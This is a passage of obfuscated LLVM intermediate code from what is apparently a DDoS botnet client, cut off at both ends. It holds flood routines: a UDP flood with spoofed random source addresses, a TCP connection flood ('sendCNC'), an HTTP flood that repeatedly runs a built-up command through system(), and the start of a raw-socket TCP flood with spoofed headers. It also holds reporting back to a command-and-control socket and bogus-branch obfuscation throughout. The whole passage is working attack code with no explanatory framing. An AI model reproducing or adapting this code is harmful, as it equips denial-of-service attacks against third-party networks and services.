  %330 = phi i32 [ %323, %322 ], [ %328, %324 ]
  %331 = trunc i32 %330 to i16
  %332 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %333 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %332, i32 0, i32 0
  %334 = bitcast %union.anon.2* %333 to %struct.anon.3*
  %335 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %334, i32 0, i32 1
  store i16 %331, i16* %335, align 2
  %336 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %337 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %336, i32 0, i32 0
  %338 = bitcast %union.anon.2* %337 to %struct.anon.3*
  %339 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %338, i32 0, i32 3
  store i16 0, i16* %339, align 2
  %340 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %341 = bitcast %struct.udphdr* %340 to i8*
  %342 = getelementptr inbounds i8, i8* %341, i64 8
  %343 = load i32, i32* %19, align 4
  call void @makeRandomStr(i8* %342, i32 %343)
  %344 = bitcast i8* %288 to i16*
  %345 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %346 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %345, i32 0, i32 2
  %347 = load i16, i16* %346, align 2
  %348 = zext i16 %347 to i32
  %349 = call zeroext i16 @csum(i16* %344, i32 %348)
  %350 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %351 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %350, i32 0, i32 7
  store i16 %349, i16* %351, align 2
  %352 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %353 = load i32, i32* %17, align 4
  %354 = add nsw i32 %352, %353
  store i32 %354, i32* %34, align 4
  store i32 0, i32* %35, align 4
  br label %355

; <label>:355:                                    ; preds = %456, %455, %329
  br label %356

; <label>:356:                                    ; preds = %355
  %357 = load i32, i32* %27, align 4
  %358 = bitcast %struct.sockaddr_in* %21 to %struct.sockaddr*
  %359 = call i64 @sendto(i32 %357, i8* %288, i64 %286, i32 0, %struct.sockaddr* %358, i32 16)
  %360 = call i32 @rand_cmwc()
  %361 = trunc i32 %360 to i16
  %362 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %363 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %362, i32 0, i32 0
  %364 = bitcast %union.anon.2* %363 to %struct.anon.3*
  %365 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %364, i32 0, i32 0
  store i16 %361, i16* %365, align 2
  %366 = load i32, i32* %16, align 4
  %367 = icmp eq i32 %366, 0
  br i1 %367, label %368, label %386

; <label>:368:                                    ; preds = %356
  %369 = load i32, i32* @x.67
  %370 = load i32, i32* @y.68
  %371 = sub i32 %369, 1
  %372 = mul i32 %369, %371
  %373 = urem i32 %372, 2
  %374 = icmp eq i32 %373, 0
  %375 = icmp slt i32 %370, 10
  %376 = or i1 %374, %375
  br i1 %376, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %368
  %377 = call i32 @rand_cmwc()
  %378 = load i32, i32* @x.67
  %379 = load i32, i32* @y.68
  %380 = sub i32 %378, 1
  %381 = mul i32 %378, %380
  %382 = urem i32 %381, 2
  %383 = icmp eq i32 %382, 0
  %384 = icmp slt i32 %379, 10
  %385 = or i1 %383, %384
  br i1 %385, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br label %407

; <label>:386:                                    ; preds = %356
  %387 = load i32, i32* @x.67
  %388 = load i32, i32* @y.68
  %389 = sub i32 %387, 1
  %390 = mul i32 %387, %389
  %391 = urem i32 %390, 2
  %392 = icmp eq i32 %391, 0
  %393 = icmp slt i32 %388, 10
  %394 = or i1 %392, %393
  br i1 %394, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %386
  %395 = load i32, i32* %16, align 4
  %396 = trunc i32 %395 to i16
  %397 = call zeroext i16 @htons(i16 zeroext %396) #13
  %398 = zext i16 %397 to i32
  %399 = load i32, i32* @x.67
  %400 = load i32, i32* @y.68
  %401 = sub i32 %399, 1
  %402 = mul i32 %399, %401
  %403 = urem i32 %402, 2
  %404 = icmp eq i32 %403, 0
  %405 = icmp slt i32 %400, 10
  %406 = or i1 %404, %405
  br i1 %406, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  br label %407

; <label>:407:                                    ; preds = %originalBBpart240, %originalBBpart236
  %408 = phi i32 [ %377, %originalBBpart236 ], [ %398, %originalBBpart240 ]
  %409 = trunc i32 %408 to i16
  %410 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %411 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %410, i32 0, i32 0
  %412 = bitcast %union.anon.2* %411 to %struct.anon.3*
  %413 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %412, i32 0, i32 1
  store i16 %409, i16* %413, align 2
  %414 = call i32 @rand_cmwc()
  %415 = trunc i32 %414 to i16
  %416 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %417 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %416, i32 0, i32 3
  store i16 %415, i16* %417, align 4
  %418 = load i32, i32* %30, align 4
  %419 = call i32 @getRandomIP(i32 %418)
  %420 = call i32 @htonl(i32 %419) #13
  %421 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %422 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %421, i32 0, i32 8
  store i32 %420, i32* %422, align 4
  %423 = bitcast i8* %288 to i16*
  %424 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %425 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %424, i32 0, i32 2
  %426 = load i16, i16* %425, align 2
  %427 = zext i16 %426 to i32
  %428 = call zeroext i16 @csum(i16* %423, i32 %427)
  %429 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %430 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %429, i32 0, i32 7
  store i16 %428, i16* %430, align 2
  %431 = load i32, i32* %35, align 4
  %432 = load i32, i32* %22, align 4
  %433 = icmp eq i32 %431, %432
  br i1 %433, label %434, label %456

; <label>:434:                                    ; preds = %407
  %435 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %436 = load i32, i32* %34, align 4
  %437 = icmp sgt i32 %435, %436
  br i1 %437, label %438, label %455

; <label>:438:                                    ; preds = %434
  %439 = load i32, i32* @x.67
  %440 = load i32, i32* @y.68
  %441 = sub i32 %439, 1
  %442 = mul i32 %439, %441
  %443 = urem i32 %442, 2
  %444 = icmp eq i32 %443, 0
  %445 = icmp slt i32 %440, 10
  %446 = or i1 %444, %445
  br i1 %446, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %438
  %447 = load i32, i32* @x.67
  %448 = load i32, i32* @y.68
  %449 = sub i32 %447, 1
  %450 = mul i32 %447, %449
  %451 = urem i32 %450, 2
  %452 = icmp eq i32 %451, 0
  %453 = icmp slt i32 %448, 10
  %454 = or i1 %452, %453
  br i1 %454, label %originalBBpart244, label %originalBB42alteredBB

originalBBpart244:                                ; preds = %originalBB42
  br label %459

; <label>:455:                                    ; preds = %434
  store i32 0, i32* %35, align 4
  br label %355

; <label>:456:                                    ; preds = %407
  %457 = load i32, i32* %35, align 4
  %458 = add i32 %457, 1
  store i32 %458, i32* %35, align 4
  br label %355

; <label>:459:                                    ; preds = %originalBBpart244
  %460 = load i32, i32* @x.67
  %461 = load i32, i32* @y.68
  %462 = sub i32 %460, 1
  %463 = mul i32 %460, %462
  %464 = urem i32 %463, 2
  %465 = icmp eq i32 %464, 0
  %466 = icmp slt i32 %461, 10
  %467 = or i1 %465, %466
  br i1 %467, label %originalBB46, label %originalBB46alteredBB

originalBB46:                                     ; preds = %originalBB46alteredBB, %459
  %468 = load i8*, i8** %31, align 8
  call void @llvm.stackrestore(i8* %468)
  %469 = load i32, i32* @x.67
  %470 = load i32, i32* @y.68
  %471 = sub i32 %469, 1
  %472 = mul i32 %469, %471
  %473 = urem i32 %472, 2
  %474 = icmp eq i32 %473, 0
  %475 = icmp slt i32 %470, 10
  %476 = or i1 %474, %475
  br i1 %476, label %originalBBpart248, label %originalBB46alteredBB

originalBBpart248:                                ; preds = %originalBB46
  br label %477

; <label>:477:                                    ; preds = %originalBBpart248, %260, %originalBBpart232, %originalBBpart228, %originalBBpart220, %136, %originalBBpart28
  %478 = load i32, i32* @x.67
  %479 = load i32, i32* @y.68
  %480 = sub i32 %478, 1
  %481 = mul i32 %478, %480
  %482 = urem i32 %481, 2
  %483 = icmp eq i32 %482, 0
  %484 = icmp slt i32 %479, 10
  %485 = or i1 %483, %484
  br i1 %485, label %originalBB50, label %originalBB50alteredBB

originalBB50:                                     ; preds = %originalBB50alteredBB, %477
  %486 = load i32, i32* @x.67
  %487 = load i32, i32* @y.68
  %488 = sub i32 %486, 1
  %489 = mul i32 %486, %488
  %490 = urem i32 %489, 2
  %491 = icmp eq i32 %490, 0
  %492 = icmp slt i32 %487, 10
  %493 = or i1 %491, %492
  br i1 %493, label %originalBBpart252, label %originalBB50alteredBB

originalBBpart252:                                ; preds = %originalBB50
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %6
  %494 = alloca i8*, align 8
  %495 = alloca i32, align 4
  %496 = alloca i32, align 4
  %497 = alloca i32, align 4
  %498 = alloca i32, align 4
  %499 = alloca i32, align 4
  %500 = alloca %struct.sockaddr_in, align 4
  %501 = alloca i32, align 4
  %502 = alloca i32, align 4
  %503 = alloca i8*, align 8
  %504 = alloca i32, align 4
  %505 = alloca i32, align 4
  %506 = alloca i32, align 4
  %507 = alloca i32, align 4
  %508 = alloca i32, align 4
  %509 = alloca i32, align 4
  %510 = alloca i8*, align 8
  %511 = alloca %struct.iphdr*, align 8
  %512 = alloca %struct.udphdr*, align 8
  %513 = alloca i32, align 4
  %514 = alloca i32, align 4
  store i8* %0, i8** %494, align 8
  store i32 %1, i32* %495, align 4
  store i32 %2, i32* %496, align 4
  store i32 %3, i32* %497, align 4
  store i32 %4, i32* %498, align 4
  store i32 %5, i32* %499, align 4
  %515 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %500, i32 0, i32 0
  store i16 2, i16* %515, align 4
  %516 = load i32, i32* %495, align 4
  %517 = icmp eq i32 %516, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %47
  %518 = call i32 @rand_cmwc()
  %519 = trunc i32 %518 to i16
  %520 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %21, i32 0, i32 1
  store i16 %519, i16* %520, align 2
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %77
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %94
  %521 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %21, i32 0, i32 3
  %522 = getelementptr inbounds [8 x i8], [8 x i8]* %521, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %522, i8 0, i64 8, i32 4, i1 false)
  %523 = load i32, i32* %20, align 4
  store i32 %523, i32* %22, align 4
  %524 = load i32, i32* %18, align 4
  %525 = icmp eq i32 %524, 32
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %116
  %526 = call i32 @socket(i32 2, i32 2, i32 17) #2
  store i32 %526, i32* %23, align 4
  %527 = load i32, i32* %23, align 4
  %528 = icmp ne i32 %527, 0
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %146
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %183
  %529 = load i32, i32* %16, align 4
  %530 = icmp eq i32 %529, 0
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %215
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %236
  %531 = load i32, i32* @mainCommSock, align 4
  %532 = call i32 (i32, i8*, ...) @sockprintf(i32 %531, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.55, i32 0, i32 0))
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %368
  %533 = call i32 @rand_cmwc()
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %386
  %534 = load i32, i32* %16, align 4
  %535 = trunc i32 %534 to i16
  %536 = call zeroext i16 @htons(i16 zeroext %535) #13
  %537 = zext i16 %536 to i32
  br label %originalBB38

originalBB42alteredBB:                            ; preds = %originalBB42, %438
  br label %originalBB42

originalBB46alteredBB:                            ; preds = %originalBB46, %459
  %538 = load i8*, i8** %31, align 8
  call void @llvm.stackrestore(i8* %538)
  br label %originalBB46

originalBB50alteredBB:                            ; preds = %originalBB50, %477
  br label %originalBB50
}

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #3

; Function Attrs: nounwind
declare void @srand(i32) #4

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #8

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #2

; Function Attrs: noinline nounwind uwtable
define void @sendCNC(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %10 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %11 = load i32, i32* %6, align 4
  %12 = add nsw i32 %10, %11
  store i32 %12, i32* %7, align 4
  %13 = load i8*, i8** %4, align 8
  %14 = call i32 @inet_addr(i8* %13) #2
  %15 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %16 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %15, i32 0, i32 0
  store i32 %14, i32* %16, align 4
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %17, align 4
  %18 = load i32, i32* %5, align 4
  %19 = trunc i32 %18 to i16
  %20 = call zeroext i16 @htons(i16 zeroext %19) #13
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %20, i16* %21, align 2
  br label %22

; <label>:22:                                     ; preds = %26, %3
  %23 = load i32, i32* %7, align 4
  %24 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %25 = icmp sgt i32 %23, %24
  br i1 %25, label %26, label %34

; <label>:26:                                     ; preds = %22
  %27 = call i32 @socket(i32 2, i32 1, i32 0) #2
  store i32 %27, i32* %8, align 4
  %28 = load i32, i32* %8, align 4
  %29 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %30 = call i32 @connect(i32 %28, %struct.sockaddr* %29, i32 16)
  %31 = call i32 @sleep(i32 1)
  %32 = load i32, i32* %8, align 4
  %33 = call i32 @close(i32 %32)
  br label %22

; <label>:34:                                     ; preds = %22
  ret void
}

declare i32 @sleep(i32) #3

; Function Attrs: noinline nounwind uwtable
define void @sendHTTP(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca %struct._IO_FILE*, align 8
  %7 = alloca i8*, align 8
  %8 = alloca [80 x i8*], align 16
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  %9 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %10 = load i32, i32* %4, align 4
  %11 = add nsw i32 %9, %10
  store i32 %11, i32* %5, align 4
  %12 = call i32 @rand() #2
  %13 = sext i32 %12 to i64
  %14 = urem i64 %13, 23
  %15 = getelementptr inbounds [23 x i8*], [23 x i8*]* @useragents, i64 0, i64 %14
  %16 = load i8*, i8** %15, align 8
  store i8* %16, i8** %7, align 8
  %17 = getelementptr inbounds [80 x i8*], [80 x i8*]* %8, i32 0, i32 0
  %18 = bitcast i8** %17 to i8*
  %19 = call i32 (i8*, i8*, ...) @sprintf(i8* %18, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.57, i32 0, i32 0)) #2
  %20 = getelementptr inbounds [80 x i8*], [80 x i8*]* %8, i32 0, i32 0
  %21 = bitcast i8** %20 to i8*
  %22 = load i8*, i8** %7, align 8
  %23 = call i8* @strcat(i8* %21, i8* %22) #2
  %24 = getelementptr inbounds [80 x i8*], [80 x i8*]* %8, i32 0, i32 0
  %25 = bitcast i8** %24 to i8*
  %26 = call i8* @strcat(i8* %25, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0)) #2
  %27 = getelementptr inbounds [80 x i8*], [80 x i8*]* %8, i32 0, i32 0
  %28 = bitcast i8** %27 to i8*
  %29 = load i8*, i8** %3, align 8
  %30 = call i8* @strcat(i8* %28, i8* %29) #2
  br label %31

; <label>:31:                                     ; preds = %51, %2
  %32 = load i32, i32* @x.71
  %33 = load i32, i32* @y.72
  %34 = sub i32 %32, 1
  %35 = mul i32 %32, %34
  %36 = urem i32 %35, 2
  %37 = icmp eq i32 %36, 0
  %38 = icmp slt i32 %33, 10
  %39 = or i1 %37, %38
  br i1 %39, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %31
  %40 = load i32, i32* %5, align 4
  %41 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %42 = icmp sgt i32 %40, %41
  %43 = load i32, i32* @x.71
  %44 = load i32, i32* @y.72
  %45 = sub i32 %43, 1
  %46 = mul i32 %43, %45
  %47 = urem i32 %46, 2
  %48 = icmp eq i32 %47, 0
  %49 = icmp slt i32 %44, 10
  %50 = or i1 %48, %49
  br i1 %50, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %42, label %51, label %74

; <label>:51:                                     ; preds = %originalBBpart2
  %52 = call i32 @rand() #2
  %53 = sext i32 %52 to i64
  %54 = urem i64 %53, 23
  %55 = getelementptr inbounds [23 x i8*], [23 x i8*]* @useragents, i64 0, i64 %54
  %56 = load i8*, i8** %55, align 8
  store i8* %56, i8** %7, align 8
  %57 = getelementptr inbounds [80 x i8*], [80 x i8*]* %8, i32 0, i32 0
  %58 = bitcast i8** %57 to i8*
  %59 = call i32 (i8*, i8*, ...) @sprintf(i8* %58, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.57, i32 0, i32 0)) #2
  %60 = getelementptr inbounds [80 x i8*], [80 x i8*]* %8, i32 0, i32 0
  %61 = bitcast i8** %60 to i8*
  %62 = load i8*, i8** %7, align 8
  %63 = call i8* @strcat(i8* %61, i8* %62) #2
  %64 = getelementptr inbounds [80 x i8*], [80 x i8*]* %8, i32 0, i32 0
  %65 = bitcast i8** %64 to i8*
  %66 = call i8* @strcat(i8* %65, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0)) #2
  %67 = getelementptr inbounds [80 x i8*], [80 x i8*]* %8, i32 0, i32 0
  %68 = bitcast i8** %67 to i8*
  %69 = load i8*, i8** %3, align 8
  %70 = call i8* @strcat(i8* %68, i8* %69) #2
  %71 = getelementptr inbounds [80 x i8*], [80 x i8*]* %8, i32 0, i32 0
  %72 = bitcast i8** %71 to i8*
  %73 = call i32 @system(i8* %72)
  br label %31

; <label>:74:                                     ; preds = %originalBBpart2
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %31
  %75 = load i32, i32* %5, align 4
  %76 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %77 = icmp sgt i32 %75, %76
  br label %originalBB
}

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #4

; Function Attrs: nounwind
declare i8* @strcat(i8*, i8*) #4

declare i32 @system(i8*) #3

; Function Attrs: noinline nounwind uwtable
define void @sendTCP(i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %8 = load i32, i32* @x.73
  %9 = load i32, i32* @y.74
  %10 = sub i32 %8, 1
  %11 = mul i32 %8, %10
  %12 = urem i32 %11, 2
  %13 = icmp eq i32 %12, 0
  %14 = icmp slt i32 %9, 10
  %15 = or i1 %13, %14
  br i1 %15, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %7
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca %struct.sockaddr_in, align 4
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i8*, align 8
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.tcphdr*, align 8
  %31 = alloca i8*, align 8
  %32 = alloca i32, align 4
  %33 = alloca i32, align 4
  store i8* %0, i8** %16, align 8
  store i32 %1, i32* %17, align 4
  store i32 %2, i32* %18, align 4
  store i32 %3, i32* %19, align 4
  store i8* %4, i8** %20, align 8
  store i32 %5, i32* %21, align 4
  store i32 %6, i32* %22, align 4
  %34 = load i32, i32* %22, align 4
  store i32 %34, i32* %23, align 4
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 0
  store i16 2, i16* %35, align 4
  %36 = load i32, i32* %17, align 4
  %37 = icmp eq i32 %36, 0
  %38 = load i32, i32* @x.73
  %39 = load i32, i32* @y.74
  %40 = sub i32 %38, 1
  %41 = mul i32 %38, %40
  %42 = urem i32 %41, 2
  %43 = icmp eq i32 %42, 0
  %44 = icmp slt i32 %39, 10
  %45 = or i1 %43, %44
  br i1 %45, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %37, label %46, label %66

; <label>:46:                                     ; preds = %originalBBpart2
  %47 = load i32, i32* @x.73
  %48 = load i32, i32* @y.74
  %49 = sub i32 %47, 1
  %50 = mul i32 %47, %49
  %51 = urem i32 %50, 2
  %52 = icmp eq i32 %51, 0
  %53 = icmp slt i32 %48, 10
  %54 = or i1 %52, %53
  br i1 %54, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %46
  %55 = call i32 @rand_cmwc()
  %56 = trunc i32 %55 to i16
  %57 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 1
  store i16 %56, i16* %57, align 2
  %58 = load i32, i32* @x.73
  %59 = load i32, i32* @y.74
  %60 = sub i32 %58, 1
  %61 = mul i32 %58, %60
  %62 = urem i32 %61, 2
  %63 = icmp eq i32 %62, 0
  %64 = icmp slt i32 %59, 10
  %65 = or i1 %63, %64
  br i1 %65, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %71

; <label>:66:                                     ; preds = %originalBBpart2
  %67 = load i32, i32* %17, align 4
  %68 = trunc i32 %67 to i16
  %69 = call zeroext i16 @htons(i16 zeroext %68) #13
  %70 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 1
  store i16 %69, i16* %70, align 2
  br label %71

; <label>:71:                                     ; preds = %66, %originalBBpart24
  %72 = load i32, i32* @x.73
  %73 = load i32, i32* @y.74
  %74 = sub i32 %72, 1
  %75 = mul i32 %72, %74
  %76 = urem i32 %75, 2
  %77 = icmp eq i32 %76, 0
  %78 = icmp slt i32 %73, 10
  %79 = or i1 %77, %78
  br i1 %79, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %71
  %80 = load i8*, i8** %16, align 8
  %81 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 2
  %82 = call i32 @getHost(i8* %80, %struct.in_addr* %81)
  %83 = icmp ne i32 %82, 0
  %84 = load i32, i32* @x.73
  %85 = load i32, i32* @y.74
  %86 = sub i32 %84, 1
  %87 = mul i32 %84, %86
  %88 = urem i32 %87, 2
  %89 = icmp eq i32 %88, 0
  %90 = icmp slt i32 %85, 10
  %91 = or i1 %89, %90
  br i1 %91, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %83, label %92, label %93

; <label>:92:                                     ; preds = %originalBBpart28
  br label %579

; <label>:93:                                     ; preds = %originalBBpart28
  %94 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 3
  %95 = getelementptr inbounds [8 x i8], [8 x i8]* %94, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %95, i8 0, i64 8, i32 4, i1 false)
  %96 = call i32 @socket(i32 2, i32 3, i32 6) #2
  store i32 %96, i32* %25, align 4
  %97 = load i32, i32* %25, align 4
  %98 = icmp ne i32 %97, 0
  br i1 %98, label %102, label %99

; <label>:99:                                     ; preds = %93
  %100 = load i32, i32* @mainCommSock, align 4
  %101 = call i32 (i32, i8*, ...) @sockprintf(i32 %100, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.55, i32 0, i32 0))
  br label %579

; <label>:102:                                    ; preds = %93
  store i32 1, i32* %26, align 4
  %103 = load i32, i32* %25, align 4
  %104 = bitcast i32* %26 to i8*
  %105 = call i32 @setsockopt(i32 %103, i32 0, i32 3, i8* %104, i32 4) #2
  %106 = icmp slt i32 %105, 0
  br i1 %106, label %107, label %110

; <label>:107:                                    ; preds = %102
  %108 = load i32, i32* @mainCommSock, align 4
  %109 = call i32 (i32, i8*, ...) @sockprintf(i32 %108, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.56, i32 0, i32 0))
  br label %579

; <label>:110:                                    ; preds = %102
  %111 = load i32, i32* %19, align 4
  %112 = icmp eq i32 %111, 0
  br i1 %112, label %113, label %114

; <label>:113:                                    ; preds = %110
  store i32 0, i32* %27, align 4
  br label %120

; <label>:114:                                    ; preds = %110
  %115 = load i32, i32* %19, align 4
  %116 = sub nsw i32 32, %115
  %117 = shl i32 1, %116
  %118 = sub nsw i32 %117, 1
  %119 = xor i32 %118, -1
  store i32 %119, i32* %27, align 4
  br label %120

; <label>:120:                                    ; preds = %114, %113
  %121 = load i32, i32* @x.73
  %122 = load i32, i32* @y.74
  %123 = sub i32 %121, 1
  %124 = mul i32 %121, %123
  %125 = urem i32 %124, 2
  %126 = icmp eq i32 %125, 0
  %127 = icmp slt i32 %122, 10
  %128 = or i1 %126, %127
  br i1 %128, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %120
  %129 = load i32, i32* %21, align 4
  %130 = sext i32 %129 to i64
  %131 = add i64 40, %130
  %132 = call i8* @llvm.stacksave()
  store i8* %132, i8** %28, align 8
  %133 = alloca i8, i64 %131, align 16
  %134 = bitcast i8* %133 to %struct.iphdr*
  store %struct.iphdr* %134, %struct.iphdr** %29, align 8
  %135 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %136 = bitcast %struct.iphdr* %135 to i8*
  %137 = getelementptr i8, i8* %136, i64 20
  %138 = bitcast i8* %137 to %struct.tcphdr*
  store %struct.tcphdr* %138, %struct.tcphdr** %30, align 8
  %139 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %140 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 2
  %141 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %140, i32 0, i32 0
  %142 = load i32, i32* %141, align 4
  %143 = load i32, i32* %27, align 4
  %144 = call i32 @getRandomIP(i32 %143)
  %145 = call i32 @htonl(i32 %144) #13
  %146 = load i32, i32* %21, align 4
  %147 = sext i32 %146 to i64
  %148 = add i64 20, %147
  %149 = trunc i64 %148 to i32
  call void @makeIPPacket(%struct.iphdr* %139, i32 %142, i32 %145, i8 zeroext 6, i32 %149)
  %150 = call i32 @rand_cmwc()
  %151 = trunc i32 %150 to i16
  %152 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %153 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %152, i32 0, i32 0
  %154 = bitcast %union.anon.0* %153 to %struct.anon.1*
  %155 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %154, i32 0, i32 0
  store i16 %151, i16* %155, align 4
  %156 = call i32 @rand_cmwc()
  %157 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %158 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %157, i32 0, i32 0
  %159 = bitcast %union.anon.0* %158 to %struct.anon.1*
  %160 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %159, i32 0, i32 2
  store i32 %156, i32* %160, align 4
  %161 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %162 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %161, i32 0, i32 0
  %163 = bitcast %union.anon.0* %162 to %struct.anon.1*
  %164 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %163, i32 0, i32 3
  store i32 0, i32* %164, align 4
  %165 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %166 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %165, i32 0, i32 0
  %167 = bitcast %union.anon.0* %166 to %struct.anon.1*
  %168 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %167, i32 0, i32 4
  %169 = load i16, i16* %168, align 4
  %170 = and i16 %169, -241
  %171 = or i16 %170, 80
  store i16 %171, i16* %168, align 4
  %172 = load i8*, i8** %20, align 8
